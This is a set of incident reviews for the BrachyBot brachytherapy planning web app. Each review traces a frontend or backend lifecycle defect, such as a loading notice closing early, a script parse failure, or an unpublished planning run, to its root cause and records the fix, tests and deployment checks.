# 2026-08-28 Incident Review — Viewer hydration lost its loading owner before visual completion

> **This is the newest authoritative review entry and is intentionally located
> at the absolute beginning of the file.**
> It records the confirmed restart behavior in which the lower-right
> `Loading case resources` notice disappeared while 3D products were still
> loading, followed later by a separate `Rendering 3D` overlay. It also
> records the associated latency review and the deployed root-cause repair.

## 1. Executive verdict

This was a real frontend lifecycle defect, not merely an animation timing
issue. The case restore transaction returned as soon as CT, 2D layers,
seed/needle geometry, and the dose overlay were usable. Its slow CTV/OAR,
isodose, and guide promises remained private inside `refreshPlanningUI()`.
`restoreActiveSessionWorkspace()` therefore executed its unconditional
`finally` close and removed the lower-right notice before those visual
products had settled. Independent 3D loaders then opened their own central
loading tokens, creating the visible silent gap and the impression that a
second reconstruction had started.

An additional fixed-duration path in `scheduleBackgroundWorkspaceRestore()`
could close the same notice after 30 seconds without consulting real task
completion. That timer made the presentation state even less reliable on a
cold server restart, where durable array hydration alone can exceed 30
seconds.

| Confirmed problem | Root cause | Status |
|---|---|---|
| Lower-right loading notice disappeared before Viewer resources were complete | The essential-data return boundary was incorrectly treated as the visual completion boundary | **FIXED** |
| A separate `Rendering 3D` overlay appeared after a gap | Workspace hydration and 3D loaders had independent presentation owners | **FIXED** |
| Loading could disappear at 30 seconds regardless of actual work | A fixed timer called `setWorkspaceHydrationState(false, ...)` | **FIXED** |
| Restart felt like two reconstruction passes | The first notice ended, then child 3D tokens became visible; the same case-scoped mesh promises were not exported to the parent transaction | **FIXED** |
| Upload Mask children could still show `Loading` after the case notice ended | `loadLabelVolumes()` launched `hydrateGenericMasksFromServer()` with `void`, outside every parent completion contract | **FIXED** |
| Full OAR restoration underused the idempotent data-plane budget | The all-OAR pass processed only three independent labels per batch | **FIXED; COLD-RESTORE BATCH CONCURRENCY IS 6** |
| Report capture could keep visual loading coupled to non-viewer work | Report repair and figure capture shared the background callback after mesh completion | **FIXED; REPORT WORK IS DOWNSTREAM OF VIEWER READINESS** |

## 2. Rechecked failure path

The failure was confirmed in the current implementation, not inferred from an
old design document:

1. `brachybot-ui-api.js::_restoreActiveSessionWorkspace()` starts label and
   planning hydration in parallel after CT is decoded.
2. `brachybot-dvh-planning.js::refreshPlanningUI()` starts isodose,
   CTV/OAR, and seed/needle work together in `_meshPromises`.
3. In `backgroundRestore` mode it waits only for the essential dose overlay
   and seed/needle validation, then resolves. The existing
   `backgroundMeshesPromise` was not part of the returned contract.
4. The outer `restoreActiveSessionWorkspace()` unconditionally hid the
   workspace notice in `finally`.
5. Each remaining child loader independently owned a
   `beginViewer3DLoading()` token. Its later visibility was therefore the
   first indication that work had never actually stopped.
6. The workspace scheduler also had a 30-second timer that explicitly hid the
   notice even if the real restore was still active.
7. Upload Mask hydration was a second untracked branch:
   `loadLabelVolumes()` started `hydrateGenericMasksFromServer(scope)` with
   `void`. Its catalogue, per-label volumes, Data Tree readiness, 2D layers,
   and generic 3D meshes could therefore remain in progress after both parent
   functions had returned.

The existing resource-level deduplication was rechecked as well:
`_structuralMeshReconstructionInFlight`, `_seeds3DLoadInFlight`, and
`_isoSurfaceLoadInFlight` already coalesce same-Session work. The defect in
this incident was primarily ownership and completion propagation; it was not
appropriate to add another reconstruction call or an artificial delay.

## 3. Root-cause repair

The deployed repair changes the transaction contract rather than masking the
gap:

1. `refreshPlanningUI()` now exposes a non-enumerable
   `backgroundCompletion` promise whose boundary includes all visible mesh
   producers and restored guide presentation.
2. The workspace restore registers that promise before returning essential
   readiness. It transfers the existing lower-right notice to
   `Promise.allSettled(backgroundTasks)`; only that real completion closes
   the notice.
3. Cold workspace hydration passes `showLoading: false` to seed/needle,
   isodose, and structural child loaders. This removes the competing central
   overlay during automatic restart recovery while preserving it for an
   explicit user-triggered 3D reconstruction.
4. Structural progress is propagated to the workspace notice with localized
   messages such as `Rendering OAR surfaces 6/58...` and
   `Finalizing the 3D scene...`.
5. The scheduler no longer closes loading at 30 seconds. Its long-running
   message remains active, and once the clinical restore wrapper starts, the
   scheduler relinquishes notice ownership completely.
6. `loadLabelVolumes()` now registers its already-parallel Upload Mask
   promise as `generic_masks`. If Viewer geometry finishes first, the same
   notice changes to `Loading Upload Mask data...`; it closes only after the
   catalogue, label volumes, Data Tree nodes, 2D layers, and eligible generic
   meshes settle.
7. CTV/OAR, seed/needle, isodose, and Upload Mask tasks remain top-level
   parallel promises.
   Full cold-restored OAR extraction now uses six read-only requests per
   batch instead of three. This applies to the idempotent Viewer data path,
   which has a separate 1,200-request/minute budget; mutation endpoints for
   upload, segmentation, chat, and planning are unchanged.
8. Report source repair and figure capture still wait for the finished Viewer
   but no longer prolong the Viewer loading indicator.
9. Cache-busting versions were advanced to
   `ui-api.js?v=50`, `3d-manual.js?v=70`,
   `dvh-planning.js?v=29`, `workspace.js?v=38`, and
   `viewer-volume.js?v=44`.

## 4. Second-pass verification

The repair was rechecked at source, runtime-contract, deployment, and browser
asset levels:

- The modified UI, workspace, planning, and 3D JavaScript bundles all pass
  `node --check`.
- A runtime Promise harness executed the exact deployed
  `restoreActiveSessionWorkspace()` function with a controlled unresolved
  visual task. The essential restore returned while loading remained active;
  resolving the visual promise then closed the same scoped notice.
- The affected frontend suites passed: **199 passed**.
- The complete remote test suite passed: **774 passed, 6 skipped, 4 warnings**.
- `git diff --check` passed.
- Code commits `8a647848f` (Viewer lifecycle/concurrency) and
  `630a69ec9` (Upload Mask completion tracking) were pushed to
  `origin/codex/session-task-recovery`.
- The live server was restarted as PID `3250049` from the authoritative
  checkout. Port 8080 is listening and
  `/tmp/brachybot_server_630a69ec9.log` contains the normal startup banner
  without a traceback, JavaScript error, reference error, critical error, or
  address-in-use failure.
- The deployed root page returns HTTP 200 and advertises all five new bundle
  versions. The deployed JavaScript responses return HTTP 200 and contain the
  new background-completion, notice-transfer, Upload Mask task registration,
  and six-way batch contracts.
- A real Chromium load through a temporary SSH port forward reached the
  deployed BrachyBot login page and loaded the five final versioned scripts.
  Browser console inspection found no `SyntaxError`, `ReferenceError`, or
  bundle-load error; its only warnings were the expected authentication
  responses from protected API probes. The temporary browser had no authenticated BrachyBot
  case session, so it could not honestly reproduce the user's private case
  hydration; no credentials, cookies, or local-storage data were inspected.

The remaining user-side acceptance is therefore narrowly defined: after one
hard refresh and server restart in an already authenticated browser, the
lower-right progress notice must remain continuously visible from case
restore through the final 3D scene, its OAR counter must increase monotonically
without restarting at a new denominator, the automatic restore must not open
a second central `Rendering 3D` overlay, and CT/2D content must remain
interactive while the progressive 3D meshes arrive.

# 2026-08-28 Incident Review — 3D bundle parse failure aborted Viewer hydration

> **This is the newest authoritative review entry and is intentionally located at the absolute beginning of the file.**
> It records the post-repair reproduction in which the backend correctly
> dispatched `viewer.refresh_planning`, but the browser reported
> `_normalizeTrajectoryId is not defined`; the 2D viewer then lost its loaded
> presentation during the incomplete restore and the 3D viewer remained empty.
> The diagnosis was rechecked against the exact remote JavaScript source, the
> HTML script order, the browser-facing call sites, and JavaScript parsing.

## 1. Executive verdict

This was a real frontend asset failure, not a planning-data or AI-provider
failure. The current remote `brachybot-3d-manual.js` could not be parsed by a
browser because the frozen OAR ID expression in
`loadCTVAndObstacleMeshes()` ended with a closing square bracket before the
closing parenthesis:

```javascript
.sort((a, b) => a - b)]
```

Because the file is one classic script, a parse error prevents the entire file
from executing. The browser therefore never installed the 3D module's global
functions, including `_normalizeTrajectoryId`, `loadSeeds3D`, mesh rendering,
and structural reconstruction. `refreshPlanningUI()` later reached
`updateSeeds()`/`updateTrajectories()` and failed at the missing helper. The
refresh transaction had already started updating the presentation, so the
error also left the 2D viewer in an incomplete state. This accounts for both
the reported `ReferenceError` and the empty 3D viewer after loading.

| Confirmed problem | Root cause | Status |
|---|---|---|
| `viewer.refresh_planning` was dispatched but failed in the browser | The entire 3D classic script was rejected by a JavaScript syntax error | **FIXED** |
| `_normalizeTrajectoryId is not defined` appeared during planning refresh | The helper was declared later in the script that never executed | **FIXED** |
| Existing 2D presentation could disappear while the refresh was incomplete | The hydration path was allowed to continue after a failed dependency bundle and had no earlier shared helper fallback | **FIXED** |
| 3D viewer remained empty after all data was reported as loaded | 3D scene initialization, mesh loaders, and planning geometry functions were absent after script parse failure | **FIXED** |
| An old cached classic script could be mixed with a newly changed UI bundle | The changed script URLs retained the old `v48`/`v68` cache keys | **FIXED** |

## 2. Direct source evidence and failure path

The remote HTML loads the classic bundles in this order: `brachybot-ui-api.js`,
`brachybot-viewer-volume.js`, `brachybot-viewer-layout.js`,
`brachybot-3d-manual.js`, and then `brachybot-dvh-planning.js`. The latter two
bundles call `_normalizeTrajectoryId` by its unqualified global name. The
helper was defined at line 4208 of the 3D bundle, but that bundle contained
the malformed expression at line 5527. Running the exact remote file through a
JavaScript parser reproduced:

```text
SyntaxError: missing ) after argument list
```

This is why a server-side Python test could pass while the real browser still
failed: Python never parses or executes the frontend bundle. The backend log
confirmed that the new action itself succeeded; the error was emitted by the
browser while executing the returned action.

## 3. Root-cause repair

The repair has four parts:

1. Close the OAR ID expression correctly as
   `.sort((a, b) => a - b))]`, allowing the whole 3D bundle to parse and
   execute.
2. Define a compatible canonical `_normalizeTrajectoryId` in the earlier
   `brachybot-ui-api.js` bundle. This protects the cross-bundle contract if a
   later optional 3D bundle is delayed or fails to load; the 3D bundle retains
   the same normalization semantics.
3. Bump the cache keys in `web/app/index.html` to `ui-api.js?v=49` and
   `3d-manual.js?v=69`, preventing an open browser from combining stale and
   current classic scripts during deployment.
4. Add a frontend dependency-contract test that verifies the cache versions,
   the shared helper, the corrected expression, and—when Node is available—
   runs `node --check` on the UI, 3D, layout, DVH, and volume bundles.

The existing Viewer refresh action remains the canonical state path: it loads
the active Session's CT/labels/planning data and progressively rebuilds the
2D layers, seeds/needles, CTV/OAR meshes, dose overlay, isodose surfaces, DVH,
and guide. No new planning or dose calculation is introduced by this repair.

## 4. Verification

The second-pass checks on the remote checkout are:

- The exact changed 3D bundle, plus the layout, DVH, volume, and UI bundles,
  pass JavaScript syntax checks with the local Node parser. The remote runtime
  image does not contain Node, so the repository test also contains a static
  fallback contract for that environment.
- The Viewer-specific runtime contract test passed: `4 passed`.
- The affected regression modules passed: `19 passed`.
- The complete remote Python suite passed: `772 passed, 6 skipped, 4 warnings`.
- `git diff --check` passed with no whitespace errors.
- The remote source contains the corrected `sort` expression and both bumped
  script versions; no test source still requires the old `v48`/`v68` values
  (stale bytecode cache matches are not source files).

The deployment check is complete. Commit `d24c7e2eb` was pushed to
`origin/codex/session-task-recovery`, and the live server was restarted from
that revision as PID `3229883` using
`/home/lht/.conda/envs/brachytherapy/bin/python3.12 web/server.py --host
0.0.0.0`. Port 8080 is listening and the startup log
`/tmp/brachybot_server_d24c7e2eb.log` contains the normal Flask banner with no
traceback, error, critical, exception, or address-in-use lines.

The deployed `/` response returned HTTP 200 and contains the new
`brachybot-ui-api.js?v=49` and `brachybot-3d-manual.js?v=69` URLs. The deployed
3D bundle returned HTTP 200 and contains the corrected expression. An
unauthenticated `/api/status` probe returned HTTP 401, confirming reachability
without weakening the authentication boundary.

An authenticated browser replay was not available from the SSH shell, so the
final visual acceptance still belongs to the user's browser after one hard
refresh: the exact request must produce no `_normalizeTrajectoryId` error,
preserve the already-painted 2D CT/label layers while 3D meshes load, and
finish with non-empty 3D planning objects. The server/action and JavaScript
contracts are now covered by the tests above and the deployed asset itself has
been checked.

# 2026-08-28 Incident Review — Provider failure blocked the deterministic “show results in Viewer” request

> **This is the newest authoritative review entry and is intentionally located at the absolute beginning of the file.**
> It records the failure in which the user asked `将结果在viewer中显示出来啊`, the
> local classifier reported `ui_control`, but the turn still attempted an LLM
> call and ended with `AI 语言服务暂时不可用`. The diagnosis was rechecked
> against the remote source, the action registry, the frontend refresh path,
> and a provider-independent stream test.

## 1. Executive verdict

This was a real routing and execution-contract defect. The request was a
deterministic, read-only request to re-display planning data that was already
owned by the active Session. It should have refreshed the Viewer/Data Tree
from the canonical saved planning result. Instead, the local policy classified
it only as generic `ui_control`, did not authorize direct execution, and the
streaming workflow's direct-tool allow-list did not include that intent. The
request consequently fell through to the generic LLM function-calling path.
When the language provider was unavailable, a browser refresh failed before
any UI action was sent. No planning or dose computation was required for this
request, so making the provider more reliable would not fix the contract
defect.

| Confirmed problem | Root cause | Status |
|---|---|---|
| An unambiguous request to show existing planning results failed when the LLM provider was unavailable | `ui_control` was classified with `direct_execution=False`; the stream direct-intent tuple omitted this operation, so the request entered the generic LLM path | **FIXED** |
| The backend had no typed action for “reload the active planning result into the Viewer” | `ui_controller` exposed panel/viewer controls but no action connected to the canonical planning hydration routine | **FIXED** |
| Even after adding a direct action, the stream could enter planning-report finalization and depend on planning-only helper methods | The generic direct-tool tail unconditionally built clinical response state before checking this new browser-only intent | **FIXED** |
| A successful response could claim that the Viewer was refreshed without specifying the no-recompute boundary | The request had no localized, operation-specific result contract | **FIXED** |

## 2. Direct source evidence and failure path

The remote `agent_runtime/turn_policy.py` classifier recognized the screenshot
request as `ui_control`, but returned no direct execution grant. In
`agent_runtime/chat_workflows.py`, the streaming direct-tool condition allowed
segmentation, planning, guide generation, and dose recomputation, but not
`ui_control`. The request therefore proceeded to
`_run_llm_function_calling_stream()`. The trace's `LLM 调用 1` failure is the
expected observable result of that path when the configured provider is
unavailable; it is not evidence that Viewer rendering itself failed.

The frontend already had the canonical `refreshPlanningUI()` implementation.
That routine reads `/planning/results` and `/planning/runs` for the active
Session, retries an in-progress hydration response, restores seeds, needles,
dose/DVH and mesh data, and updates the Data Tree. Before this repair, no
typed `viewer.refresh_planning` action invoked it from the chat UI. A panel
switch alone could not restore the saved result.

## 3. Root-cause repair

The repair establishes an end-to-end contract for this operation:

1. `is_viewer_result_display_request()` recognizes only an unambiguous
   Viewer display/load/refresh request that also names an existing result
   family. Compound requests remain outside this fast path so a mixed request
   is not silently truncated.
2. `classify_local_turn()` returns a low-risk `viewer_display` policy with
   `direct_execution=True`, no router/completeness review, and an explicit
   `ui_controller` execution grant.
3. `_detect_tool_request()` emits the typed action
   `viewer.refresh_planning: run`; the `UIControllerTool` registry validates
   that target before it can reach the browser.
4. The frontend action handler calls the existing canonical
   `refreshPlanningUI()` using the owner/active Session, `retryPending=true`,
   `backgroundRestore=true`, `preserveReport=true`,
   `preserveViewerState=false`, `autoGenerateGuide=false`, and
   `switchToViewers=true`. This refreshes the current presentation without
   rerunning planning, recomputing dose, regenerating a guide, or rewriting a
   report.
5. Both regular and streaming chat paths execute this action without an LLM
   call and return a language-matched acknowledgement. The streaming path
   terminates before the clinical planning-report tail, so it has no accidental
   dependency on planning-only helpers.
6. UI result formatting also recognizes the action and keeps the server trace
   and user response consistent in Chinese and English.

## 4. Verification

The second-pass checks on the remote checkout are:

- Python compilation passed for every changed Python module and the new test
  module.
- The focused runtime contract test passed: `5 passed`.
- The broader routing/UI regression set passed: `353 passed`.
- `git diff --check` passed with no whitespace errors.
- The direct runtime probe classified the exact user message as
  `viewer_display` and emitted only the typed `ui_controller` action.

The deployment check is complete on the remote checkout. Commit
`a0a954d95` was pushed to `origin/codex/session-task-recovery`. The live
server was restarted from that commit as PID `3217041`, using the existing
`web/server.py --host 0.0.0.0` command and the same configured runtime
environment. Port 8080 is listening, and
`/tmp/brachybot_server_a0a954d95.log` contains the normal Flask startup banner
with no traceback, error, critical, exception, or address-in-use lines. An
unauthenticated `/api/status` probe returned HTTP 401, confirming that the
server is reachable while its authentication boundary remains active.

An authenticated browser replay of the exact user request was not performed
from this shell because no browser Session credentials were available. The
provider-independent policy, typed backend action, frontend hydration call,
and stream integration are covered by the tests above. In the browser, the
acceptance condition is: the trace contains the local UI action, the
Viewer/Data Tree refreshes from the active Session, and no
`planning_pipeline` or dose-recomputation call appears.

# 2026-08-27 Incident Review — Completed replan produced empty Planning nodes after restart

> **This is the newest authoritative review entry and is intentionally located at the absolute beginning of the file.**
> It records the failure in which `重新规划一遍吧` reported a completed planning
> result, while the viewer and Data Tree showed only empty Planning children.
> The diagnosis below is based on the live remote session snapshot, the live
> server log, and direct source inspection; it is separate from the older chat
> handshake incident immediately below.

## 1. Executive verdict

This was a real persistence/lifecycle defect in the planning pipeline. The
algorithm did complete and wrote the new seeds, validated needle geometry, dose
grid, and metrics into the session's mutable planning aliases. However, the
pipeline reserved a new Planning registry row and never committed the
successful result into the immutable `planning_run:<planning_id>` snapshot or
changed the row from `running` to `completed`. The restart hydration code
therefore had no namespaced run to restore and the UI correctly rendered the
registry row as an empty/incomplete Planning.

| Confirmed problem | Root cause | Status |
|---|---|---|
| A completed replan was announced in chat but the viewer/Data Tree had no new seeds, needles, dose, or planning artifacts | `PlanningPipelineTool._execute()` called `begin_planning_run()` before computation, but had no success-path call to `publish_planning_run()` | **FIXED** |
| The new Planning row remained `status=running` with null counts and no artifact flags | The registry is updated at `begin_planning_run()`, while status/counts/visibility are updated only by `publish_planning_run()` | **FIXED** |
| Restart hydration could restore the raw root aliases but not the selected Planning | There was no `planning_run:<new_id>` key in the persisted snapshot, so the Planning registry and viewer projection had no immutable source | **FIXED** |
| A persistence failure could have been reported as a successful clinical plan | The pipeline returned the algorithm's success result without making registry publication part of the success contract | **FIXED** |

## 2. Direct evidence from the affected remote session

The affected session was inspected on the current remote checkout before the
repair. The persisted snapshot contained:

- `active_planning_id = planning-96d87716e2374f1abc93a1c7a1b942be`;
- root aliases containing the newly computed `seed_plan` (8 entries),
  `seed_positions`, `verified_needle_geometry`, `dose_distribution`,
  `dose_metrics`, `total_seeds=52`, and `num_trajectories=8`;
- a `planning_runs` row for `planning-96d877...` labelled `Planning_6`, but
  with `status=running`, `visible=true`, and null seed/trajectory/dose/guide
  fields; and
- no `planning_run:planning-96d877...` namespaced snapshot at all.

The live server log showed the same ordering: `planning_pipeline` completed
successfully and logged `seed_plan=8 entries, total_seeds=52`, but there was no
`planning.run.published`, `planning.run.completed.visibility`, or publication
of the new namespaced run. This proves that the missing display was not caused
by the viewer's geometry renderer, a browser cache, or a failed dose
calculation.

The frontend already schedules `refreshPlanningUI()` after the terminal
planning event and refreshes both `/planning/results` and `/planning/runs`.
That refresh path was consuming the incomplete backend registry exactly as
stored; changing only the frontend would have hidden the symptom temporarily
and would still lose the plan on restart.

## 3. Root-cause repair

`tool_factory/seed_plan/planning_pipeline.py::PlanningPipelineTool._execute()`
now treats registry publication as part of the planning transaction:

1. A successful `full` pipeline calls `publish_planning_run(...,
   status="completed")` before returning to the chat/task layer.
2. A successful terminal `dose_eval` step is also published as
   `completed`; intermediate stepwise calls publish as `running` so the next
   step reuses the same draft/run rather than creating a new row for every
   stage.
3. The returned planning ID is checked against the reserved ID. A missing or
   unexpected ID is a commit failure, not a successful plan.
4. If publication fails, the new run is marked failed and the previous
   immutable run is restored where available. The tool returns a failure
   result instead of claiming that the viewer contains a valid plan.

This makes the durable commit happen before the success response. The normal
frontend terminal refresh can then read a completed registry row and the
matching immutable snapshot, and the same data remains available to the
restart hydration path.

## 4. Verification

The repair includes a regression test that executes the pipeline entry point
with a stubbed successful computation and asserts that the reserved Planning
ID is published as `completed` before `_execute()` returns. On the current
remote checkout, Python compilation passed, the focused planning/persistence
suite passed (`128 passed`), the complete suite passed (`769 passed,
6 skipped`), and `git diff --check` reported no whitespace errors. The live
server was then restarted from the clean remote checkout: PID `3207829` is
running `/home/lht/.conda/envs/brachytherapy/bin/python3.12 web/server.py
--host 0.0.0.0` from `/home/lht/snap/brachyplan/BrachyBot`, commit
`4ea39295e`, and port 8080 is listening. The new startup log contains no
traceback, error, critical, or exception lines. An unauthenticated registry
probe correctly returned HTTP 401, so the authentication boundary remained
active during the restart check.

The final user-case acceptance still requires running one new full replan from
the browser: the previously affected `planning-96d877...` row was created by
the old buggy version and has no immutable snapshot to reconstruct. The
repair guarantees that a new successful run creates that snapshot before the
success response is emitted.

The affected historical row is not silently rewritten: it remains audit
material showing the pre-repair state. A newly completed replan after this
repair is the acceptance case and must produce a non-empty
`planning_run:<planning_id>` snapshot plus populated registry counts/flags.

# 2026-08-27 Incident Review — Chat request rejected after a 30-second handshake stall

> **This is the newest authoritative review entry and is intentionally located at the absolute beginning of the file.**
> It records the failure shown after the user sent `重新规划一遍吧`: the UI
> created its optimistic trace, left the request-analysis row pending, and then
> reported `本次请求暂时无法完成` at approximately 30 seconds. The entry
> covers the actual request/worker/persistence ordering and the corrective
> implementation. Earlier incident entries remain below as audit material.

## 1. Executive verdict

This was a real chat-stream handshake defect, not a planning-pipeline failure
and not a provider rate-limit response. The browser's connection timer aborted
the request after 30 seconds because the streaming route performed synchronous
workspace persistence before returning the `text/event-stream` response. A
large snapshot or a busy SQLite database could therefore keep the HTTP request
inside `api_chat()` until the frontend's connection deadline expired. Because
the optimistic trace is rendered before the fetch resolves, the user saw its
placeholder row (`多智能体路由`) remain `PENDING` and then received the generic
failure message.

| Confirmed problem | Root cause | Status |
|---|---|---|
| A planning chat request could fail at exactly about 30 seconds before any server task metadata arrived | `api_chat()` created the task, then synchronously called `load_snapshot()` and `save_snapshot_patch()` before returning the SSE `Response`; the browser uses `CHAT_CONNECT_TIMEOUT_MS = 30000`. | **FIXED** |
| The task was created in memory but the browser could not reconnect to it after the request was aborted | `task_meta` was the first generator event, but the generator was unreachable until the request-thread persistence block completed. | **FIXED** |
| A fast task could race a late task-start marker if persistence were simply moved after worker start | The worker's `start_gate` was already designed to protect the ordering, but the gate was released only by the request thread. | **FIXED** |
| A local/direct planning request was displayed as a pending Multi-Agent Router run | The frontend seeded a connection placeholder with the literal router title before server trace metadata was known. | **FIXED** |

## 2. Direct source evidence

The current remote source was checked against the live server before editing:

- `web/app/static/js/brachybot-chat-todo.js` defines
  `CHAT_CONNECT_TIMEOUT_MS = 30000` and starts that timer before
  `fetch(API + '/chat')`. The timer is cleared only after `fetch()` receives
  the response. The optimistic trace was seeded immediately with a thinking
  step titled `多智能体路由` / `Multi-Agent Router`.
- `web/routes/planning_routes.py::api_chat()` called
  `chat_tasks.start(...)` with a closed `start_gate`, but then synchronously
  performed workspace checkpoint/task-identity persistence before constructing
  and returning the SSE `Response`.
- The persistence path called `store.load_snapshot()` and
  `store.save_snapshot_patch()`. Those operations use the case guard, JSON
  snapshot I/O, SQLite metadata updates, and audit writes. The workspace store
  also permits large background checkpoint work, so contention with a previous
  checkpoint can make this control-plane write exceed 30 seconds.
- `web/chat_tasks.py` deliberately waits on `start_gate` in the worker. This
  proves the intended contract is “persist the recoverable start marker, then
  release the worker,” not “block the HTTP handshake until persistence
  finishes.”
- `agent_runtime/turn_policy.py` classifies `重新规划一遍吧` as a planning
  re-execution action with `use_router=False`. Therefore the literal router
  placeholder was not evidence that the multi-agent router had actually run.

## 3. Root-cause repair

### 3.1 Return the stream handshake before slow persistence

`api_chat()` now defines `persist_chat_task_start()` and runs it in a daemon
thread after `chat_tasks.start()` returns. The route immediately returns the
SSE response, whose first event is `task_meta`. This makes the task ID visible
to the browser and enables reconnection even while the case snapshot is busy.
The 30-second frontend timer therefore measures actual response availability,
not the duration of unrelated persistence work.

The background function captures explicit values (`store`, owner ID, session
ID, task, and message data) and never accesses Flask's request context after
the route returns. It logs completion, deleted-session skips, and unexpected
failures instead of silently hiding them.

### 3.2 Preserve the task-start ordering contract

The worker gate remains closed until the background persistence function has
attempted its control-plane write. The function atomically writes the user
message, task identity, running chat status, and operation checkpoint in one
`chat.task.started` snapshot patch. Only then does its `finally` block release
`start_gate`. This retains the refresh/replay invariant without holding the
HTTP request open.

The initial stream path no longer calls `checkpoint_operation()`, because that
helper depends on request context and its full-agent checkpoint is not needed
to make a newly accepted task discoverable. Later task progress and finalization
continue to own their normal agent checkpoint paths, so moving this control
plane write does not discard the task's clinical results.

### 3.3 Make the optimistic trace semantically accurate

The client-side row is now `请求分析` / `Request analysis` with
`正在确定执行路径…` / `Determining execution path...`. It is explicitly a
connection placeholder and does not claim that a multi-agent router executed.
Persisted historical rows remain localizable through the existing compatibility
mapping. `web/app/index.html` increments the script cache version for
`brachybot-chat-todo.js` from `v=20` to `v=21`, so an already-open browser does
not silently retain the misleading placeholder.

## 4. Verification contract

The regression suite now checks that:

- the stream route contains a deferred `persist_chat_task_start()` thread;
- the deferred function writes the chat marker and operation together;
- `start_gate.set()` remains in the deferred function's `finally` path;
- the stream request path itself contains no request-context
  `checkpoint_operation()` call;
- the optimistic placeholder uses the neutral request-analysis label and no
  longer seeds the literal Multi-Agent Router title.

The remote focused tests, Python compilation, JavaScript syntax check, clean
diff check, and live-server restart/health check are recorded below.

## 5. Deployment status

**FIXED, verified, committed, pushed, and running on the remote server.**

## 6. Verification evidence

- Remote focused regression group: `135 passed, 3 warnings`.
- Full remote suite: `768 passed, 6 skipped, 4 warnings in 54.99s`.
- Remote Python 3.12 compilation of the changed Python files passed.
- JavaScript syntax check of `brachybot-chat-todo.js` passed with Node.js
  `v24.14.0`.
- The frontend contract test also verifies the `brachybot-chat-todo.js?v=21`
  cache-busting reference in `web/app/index.html`.
- Remote `git diff --check` passed before commit.
- Commit `2fbb79aa8` is present on
  `codex/session-task-recovery` and was pushed to
  `origin/codex/session-task-recovery`.
- The live server was restarted from that checkout with PID `3181186`, cwd
  `/home/lht/snap/brachyplan/BrachyBot`, and listener `0.0.0.0:8080`.
- The startup log contains no traceback after the server was started with the
  existing trusted-network development setting. An unauthenticated loopback
  probe returned HTTP `401 Authentication required`, which is the expected
  session-auth response rather than a server startup failure.

The first manual restart attempt without the existing remote-bind environment
setting was rejected by the server's security guard before application startup;
that refusal was expected and was corrected by restoring the prior launch
configuration, not by weakening the guard.

---

# 2026-08-27 Incident Review — 3D OAR reconstruction progress restarted with a larger denominator

> **This is the newest authoritative review entry and is intentionally located at the absolute beginning of the file.**
> It records the viewer report in which 3D reconstruction first displayed a
> subset-sized progress value (for example, `3/37`) and then unexpectedly
> restarted at `3/58` or `3/59`. The earlier contextual-routing entry and all
> historical incident entries remain below as audit material.

## 1. Executive verdict

This was a real frontend reconstruction orchestration defect. The first group
of OAR meshes was not necessarily discarded: existing meshes were often found
and skipped by `_sceneHasMesh()`. However, the loader deliberately executed
two sequential OAR passes with different target sets, and each pass owned the
same progress surface. The second pass therefore reset the visible progress
denominator and could repeat network work when another forced prewarm was
running. The user-visible result looked like the first 30-odd reconstructions
had been wasted, and cold-start timing could make the target set change while
the scene was already rendering.

| Confirmed problem | Root cause | Status |
|---|---|---|
| Progress changed from a subset count to a larger count during one restore | `loadCTVAndObstacleMeshes()` first called `prewarmSegmentationMeshes('all', ...)`, which fell back to non-traversable OARs, then called it again with `allOAR: true` after `oarLabelData` became available. | **FIXED** |
| The second pass appeared to restart from `3/N` | `prewarmSegmentationMeshes()` computed and displayed a fresh denominator on every invocation; it did not represent one immutable reconstruction job. | **FIXED** |
| Cold restart could choose an incomplete OAR set | `refreshPlanningUI()` and the independent session label task ran in parallel, so the structural loader could inspect `dataTreeState.organs` before the binary labels and derived nodes were complete. | **FIXED** |
| Multiple structural callers could overlap | Planning restore, segmentation restore, and explicit 3D reconstruction had no case-scoped in-flight barrier around the whole structural operation; only individual mesh tasks were coalesced. | **FIXED** |

## 2. Direct source evidence

The relevant current-code chain was verified in the remote checkout:

- `web/app/static/js/brachybot-3d-manual.js::loadCTVAndObstacleMeshes()` had
  two `await prewarmSegmentationMeshes('all', ...)` calls. The first omitted
  `allOAR` and used `_getNonTraversableOarMeshIds()`. The second used
  `allOAR: true` whenever `oarLabelData` was truthy.
- `prewarmSegmentationMeshes()` reported progress using the current
  invocation's `oarIds.length`. A change from the first invocation to the
  second therefore changed the denominator even if the first meshes remained
  in `scene3D.meshes`.
- `_fetchAndAddOrganMesh()` returned `exists` only when `force` was false.
  That protected part of the first pass from duplicate requests, but it did
  not prevent the second pass's traversal or protect against a concurrent
  forced prewarm.
- `web/app/static/js/brachybot-ui-api.js::_restoreActiveSessionWorkspace()`
  created `labelTask` and `planningTask` in parallel. The planning refresh
  could reach the mesh phase before the complete OAR label projection was
  visible in the Data Tree.
- `web/app/static/js/brachybot-dvh-planning.js::refreshPlanningUI()` was a
  whole-planning caller of the structural loader, while the segmentation-only
  restore and explicit 3D toolbar path were separate producers.

## 3. Root-cause repair

### 3.1 One stable label boundary before mesh selection

The cold workspace restore now passes its actual `labelTask` promise to
`refreshPlanningUI()` as `labelsReady`. The planning mesh phase passes that
promise to `loadCTVAndObstacleMeshes()`, which waits for label hydration before
selecting any OAR mesh targets. An explicit reconstruction with no supplied
label promise also performs one label load if both label arrays are absent,
instead of beginning a partial mesh pass.

### 3.2 One frozen OAR target list and one structural pass

After the label boundary, `loadCTVAndObstacleMeshes()` snapshots the complete
current OAR label IDs and passes them as `oarIds` to exactly one
`prewarmSegmentationMeshes('all', ...)` invocation. An explicitly empty list
is preserved as empty; it is not silently replaced by a later fallback list.
Metadata that arrives later may improve names and object metadata, but cannot
reset the reconstruction denominator.

### 3.3 Whole-operation coalescing and stale fencing

The structural loader now keeps one in-flight promise per session and
segmentation generation. A concurrent planning restore or explicit viewer
request receives the same promise rather than starting another top-level
reconstruction. Session/generation invalidation clears the barrier and late
old-case requests are rejected as stale before they can mutate the new scene.
The per-batch loop also checks the same fence.

The intended progress sequence is now one monotonic sequence for one target
snapshot, such as:

```text
Rendering target and obstacle surfaces...
Rendering OAR surfaces 3/58...
Rendering OAR surfaces 6/58...
...
Rendering OAR surfaces 58/58...
Finalizing 3D scene...
```

There is no internal `3/37`-then-`3/58` restart for the same structural
restore. If a new segmentation truly changes the structure generation, it is
correctly treated as a new reconstruction rather than mixed into the old one.

## 4. Verification requirement

The regression contract now asserts that the structural loader has one
prewarm call, waits for `labelsReady`, freezes `oarIds`, coalesces concurrent
calls, and invalidates the whole-operation barrier with the case generation.
Focused and full-suite results will be recorded below after the remote test
run and live-server restart.

---

